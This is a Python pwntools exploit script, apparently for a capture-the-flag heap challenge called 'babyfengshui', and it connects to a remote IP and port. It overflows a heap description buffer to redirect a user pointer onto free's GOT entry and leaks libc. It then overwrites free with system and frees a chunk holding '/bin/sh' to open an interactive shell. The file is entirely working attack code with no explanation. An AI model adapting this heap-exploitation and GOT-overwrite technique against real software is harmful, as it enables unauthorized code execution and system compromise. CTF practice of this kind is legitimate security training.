#!/usr/bin/python

from pwn import *

DEBUG = True

p = remote("78.46.224.83", 1456)
free_offset = 0x760f0
system_offset = 0x3e3e0

#p = process("./babyfengshui")
#free_offset = 0x712f0
#system_offset = 0x3ada0

def r(msg):
  response = p.recvuntil(msg)
  if (DEBUG):
    log.info(response)
  return response

def int_update_description(length, text):
  r("length: ")
  p.sendline(str(length))

  r("text: ")
  p.send(text)

  sleep(0.1)

def add_user(size, name, length, description):
  r("Action: ")
  p.sendline("0")

  r("description: ")
  p.sendline(str(size))

  r("name: ")
  p.sendline(name)

  int_update_description(length, description)

def delete_user(idx):
  r("Action: ")
  p.sendline("1")

  r("index: ")
  p.sendline(str(idx))

def display_user(idx):
  r("Action: ")
  p.sendline("2")

  r("index: ")
  p.sendline(str(idx))

def update_description(idx, length, description):
  r("Action: ")
  p.sendline("3")

  r("index: ")
  p.sendline(str(idx))

  int_update_description(length, description)

SIZE = 0x70
FAST_SIZE = 0x30
NAME_SIZE = 0x7c

target = 0x804b010

add_user(SIZE, "A", SIZE, "A\n")
add_user(FAST_SIZE, "A", FAST_SIZE, "A\n")
add_user(8, "A", 8, "/bin/sh\0")

delete_user(0)

payload = "A" * 0xf8
payload += p32(0)
payload += p32(0x38 | 1)
payload += "A" * 0x30
payload += p32(0)
payload += p32(0x88 | 1)
payload += p32(target)

add_user(0xf8, "A", len(payload), payload)

display_user(1)

r("description: ")
free_addr = u32(r("\n")[:4])
system_addr = free_addr - free_offset + system_offset

print "free leak: 0x%x" % free_addr

update_description(1, 4, p32(system_addr))

delete_user(2)

p.interactive()

p.close()
